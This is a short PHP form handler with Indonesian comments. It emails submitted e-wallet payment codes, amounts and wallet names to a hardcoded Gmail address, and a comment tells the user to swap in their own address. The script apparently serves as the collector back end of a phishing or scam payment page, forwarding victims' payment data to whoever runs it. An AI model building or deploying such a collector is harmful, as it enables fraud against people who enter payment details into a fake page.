<?php
$emailku = 'premiumstore5527@gmail.com'; // GANTI EMAIL KAMU DISINI

// Proses form jika metode POST digunakan
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['paymentCode'])) {
    $paymentCode = htmlspecialchars($_POST['paymentCode']);
    $amount = htmlspecialchars($_POST['amount']);
    $ewallet = htmlspecialchars($_POST['ewallet']);

    // Buat subjek email
    $subjek = "Kode Pembayaran Anda: $paymentCode";

    // Buat isi email dalam format HTML
    $pesan = "
    <center>
        <div style='background: #000; width: 294px; color: #fff; text-align: left; padding: 10px;'>Kode Pembayaran</div>
        <table style='border-collapse: collapse; border-color: #888; color: #888; text-align: left;' border='1'>
            <tr>
                <th style='padding: 10px;'>Payment Code</th>
                <td style='padding: 10px;'>$paymentCode</td>
            </tr>
            <tr>
                <th style='padding: 10px;'>Amount</th>
                <td style='padding: 10px;'>$amount</td>
            </tr>
            <tr>
                <th style='padding: 10px;'>E-Wallet</th>
                <td style='padding: 10px;'>$ewallet</td>
            </tr>
        </table>
    </center>
    ";

    // Set header email
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= 'From: <no-reply@yourdomain.com>' . "\r\n";

    // Kirim email
    if (mail($emailku, $subjek, $pesan, $headers)) {
        // Kirim respons sukses ke HTML
        echo "Email terkirim.";
    } else {
        // Kirim respons gagal ke HTML
        echo "Email gagal dikirim.";
    }
}
?>
